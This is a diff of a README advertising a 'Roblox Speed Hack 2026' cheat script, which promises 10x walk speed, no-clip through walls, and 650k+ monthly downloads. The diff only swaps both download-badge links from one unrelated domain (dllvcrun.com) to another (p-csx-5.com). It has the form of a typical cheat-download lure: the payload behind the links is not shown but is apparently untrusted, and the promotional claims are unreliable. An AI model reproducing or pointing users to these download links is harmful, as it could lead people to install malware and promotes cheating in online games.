@@ -1,6 +1,6 @@
 # Roblox Speed Hack 2026 — Walk Fast
 
-[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://dllvcrun.com/rblxspeed)
+[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://p-csx-5.com/rblxspeed)
 
 > **Roblox speed hack script — multiply walk speed up to 10x in any game.**
 
@@ -48,7 +48,7 @@ A: Yes — walk through walls and floors.
 
 **Monthly downloads:** 650k+
 
-[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://dllvcrun.com/rblxspeed)
+[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://p-csx-5.com/rblxspeed)
 
 ---
 
